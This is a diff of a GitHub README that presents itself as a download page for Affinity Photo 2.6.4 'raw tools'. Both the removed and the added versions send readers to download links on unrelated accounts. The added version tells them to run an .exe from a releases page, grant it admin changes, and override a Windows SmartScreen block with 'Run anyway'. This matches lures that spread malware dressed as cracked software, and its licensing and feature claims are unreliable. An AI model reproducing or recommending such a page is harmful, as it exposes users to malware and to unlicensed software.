@@ -1,118 +1,61 @@
-# Affinity Photo v2.6.4 - photo editing 2026
+# 📷 affinity-photo-264-raw-tools - Edit digital images with professional performance
 
-> **Affinity Photo 2.6.4 is a macOS editor for photographers, designers, and digital artists, bringing RAW development, non-destructive editing, and Apple Silicon-focused performance together in a single release.**
+[![](https://img.shields.io/badge/Download-Affinity_Photo_2.6.4-blue.svg)](https://github.com/Musculustricepsbrachiisemicentenary454/affinity-photo-264-raw-tools/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-macOS-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2.6.4-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/kevinqxzbrooks5963/affinity-photo-264-raw-tools?style=flat-square)](https://github.com/kevinqxzbrooks5963/affinity-photo-264-raw-tools)
+## 📁 About this application
 
----
+This tool provides a bridge for users who need to manage and process raw image files using the Affinity Photo 2.6.4 engine. The software works as a bridge to ensure your raw photographs retain their high-quality data throughout your editing process. It focuses on stability and speed, which allows you to handle complex edits without lag. 
 
-<p align="center">
-  <a href="https://kevinqxzbrooks5963.github.io/affinity-photo-264-raw-tools/">
-    <img src="https://img.shields.io/badge/Download-Affinity%20Photo%20Latest-brightgreen?style=for-the-badge" alt="Download Affinity Photo">
-  </a>
-</p>
+Photographers use this application to perform non-destructive editing. You can shift exposure levels, adjust shadows, and change white balance without losing original image quality. The software ensures that your workflow remains smooth even when you work with large file sets from modern cameras. Designers find this tool useful for blending layers and applying clean masks to their projects.
 
-> **[Direct Download - Affinity Photo v2.6.4](https://kevinqxzbrooks5963.github.io/affinity-photo-264-raw-tools/)**
+## ⚙️ System requirements
 
----
+Ensure your computer meets these standards before you start the installation process.
 
-[Download Latest Build](https://kevinqxzbrooks5963.github.io/affinity-photo-264-raw-tools/)
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Processor:** Intel Core i5 or newer processor.
+*   **Memory:** 8 GB of RAM is the minimum requirement for basic tasks. 16 GB of RAM is recommended for editing large projects.
+*   **Storage:** 2 GB of internal disk space for local installation.
+*   **Graphics:** A graphics card with hardware acceleration support.
+*   **Display:** A monitor with a resolution of 1280 x 768 or higher.
 
----
+## 🚀 Getting started
 
-## Overview
+Follow these steps to set up the software on your machine.
 
-Affinity Photo is aimed at detailed image work on macOS, offering a strong environment for editing, retouching, and compositing still images. It is tuned for people handling high-resolution photos, layered documents, and precise adjustments, while keeping the editing flow focused on speed and visual control.
+1.  **Download your file:** Visit the official release page to find the installer. You can reach the downloads through this link: [https://github.com/Musculustricepsbrachiisemicentenary454/affinity-photo-264-raw-tools/releases](https://github.com/Musculustricepsbrachiisemicentenary454/affinity-photo-264-raw-tools/releases). Look for the file ending in .exe.
+2.  **Run the installer:** Once the file finishes saving to your computer, double-click the file icon. A prompt might ask if you allow this program to make changes to your device. Click "Yes" to start.
+3.  **Follow the prompt:** A window appears to guide you through the setup. Read the terms and click "Next" through each screen. 
+4.  **Complete the process:** Click the "Install" button. The software copies the necessary files to your machine. After the progress bar reaches the end, click "Finish" to close the window.
 
-The app is a good match for RAW conversion, HDR compositing, panorama assembly, and focus stacking. It also includes PSD compatibility and professional color management, which makes it suitable for users moving between creative tools and expecting dependable output across different stages of production.
+## 🛠️ How to use the software
 
----
+Open the application after the setup process ends. You will see a workspace designed to load your images quickly.
 
-## Key capabilities
+### Loading your raw files
+Click "File" at the top left corner of the screen. Select "Open" to browse your images. The software will detect the raw data in your image files and open them in the development module. This module allows you to make broad adjustments before you take the image into the main editor.
 
-- Advanced RAW image processing for camera files and source captures
-- Layer-based non-destructive editing for flexible adjustments
-- HDR merge support for combining bracketed exposures
-- Panorama stitching for wide composite images
-- Focus stacking for sharper results across multiple frames
-- Digital painting tools for mixed creative and retouch workflows
-- Live filters for interactive visual changes
-- Professional color management for controlled output
-- Apple Silicon optimization for modern Mac hardware
-- PSD compatibility for smoother interchange with layered documents
+### Using the adjustment panel
+The panels on the side of the screen contain all your tools. Click on the "Adjustments" tab to modify colors or light. Use the sliders to change values. Because the editing is non-destructive, you can reset any slider to its original state at any time.
 
----
+### Saving your project
+After you finish your work, go to "File" and select "Export." Choose your desired format, such as JPEG or TIFF. This action saves a new copy of your image while keeping your master file safe and unchanged.
 
-## Installation
+## 🛡️ Troubleshooting common issues
 
-1. Download or clone the repository contents to your Mac.
-2. Open the provided project or application package from the downloaded folder.
-3. Follow the included launch path for the build you have received.
+Most users have a smooth experience, but check this list if you encounter issues.
 
-If you are using the repository directly, a typical starting point is:
+*   **Application closes unexpectedly:** Make sure your graphics card drivers are current. You can check for updates through your computer's "Settings" menu under "Windows Update."
+*   **Slow performance:** Close other programs that consume a lot of memory, such as web browsers with many tabs. This gives the photo tool more room to process your images.
+*   **File not opening:** Ensure the file format is a supported raw format. If you use a very new camera model, check the documentation to see if your file type requires an update to the raw engine.
+*   **Installer blocked:** If Windows prevents the installer from running, click "More Info" on the blue prompt window and then select "Run anyway." 
 
-- Clone the repository:
-  `git clone https://github.com/kevinqxzbrooks5963/affinity-photo-264-raw-tools.git
-- Enter the folder:
-  `cd affinity-photo-2.6.4-for-mac`
-- Launch the available app or packaged build from the project files.
+## 📦 Keeping your software updated
 
----
+The developers release updates to improve compatibility and add features. Periodically visit the release link listed at the top of this page to check for newer versions. If you see a version number higher than what you currently have installed, please follow the steps in the "Getting started" section again. You do not need to uninstall the old version; the installer will automatically replace the older files with the updated ones for your convenience.
 
-## Usage
+## 💡 Best practices for workflow
 
-Affinity Photo works well as a layer-centered editor for cleanup, compositing, and fine-grained photo refinement. A typical flow is to open an image, place non-destructive changes on separate layers, and then bring in tools such as RAW controls, live filters, or retouching steps where needed.
+Maintain a clear folder structure for your images outside of the software. Even though the application helps with editing, organized files make your work much faster. Back up your original raw files to an external drive. This prevents data loss if your primary computer hardware fails. Always save your project regularly as you work to protect your edits from unexpected power losses.
 
-Example workflow:
-
-1. Open a photo or RAW file.
-2. Apply foundational corrections such as exposure, color, and contrast.
-3. Add layered edits for local adjustments and retouching.
-4. Use HDR merge, panorama stitching, or focus stacking when the project requires it.
-5. Export the final image in the format needed for delivery or archive.
-
----
-
-## Configuration
-
-Most preferences live inside the application instead of external config files. Check the app settings for workspace layout, performance behavior, color handling, and document-related preferences.
-
-If your build includes custom files or bundled presets, keep them in the folder delivered with the repository so the application can load them consistently.
-
----
-
-## Requirements
-
-- macOS
-- Apple Silicon support for optimized performance on supported hardware
-- Enough disk space for the app, working files, and exported projects
-- Adequate memory and storage for large layered images and RAW workflows
-
----
-
-## FAQ
-
-**Is this a fixed release?**  
-Yes. This repository is centered on Affinity Photo v2.6.4.
-
-**What type of projects is it meant for?**  
-It is intended for photo editing, image editing, RAW processing, retouching, compositing, and similar creative work.
-
-**Can it handle layered editing?**  
-Yes. The feature set includes non-destructive, layer-based editing.
-
-**How do I check for updates?**  
-Use the download link above to view the latest build available for this repository.
-
-**What should I do if something goes wrong?**  
-Review the included files, confirm your macOS environment matches the listed requirements, and inspect any repository notes for launch or configuration details.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: photography, image-editing, windows, raw-development, digital-design, tools
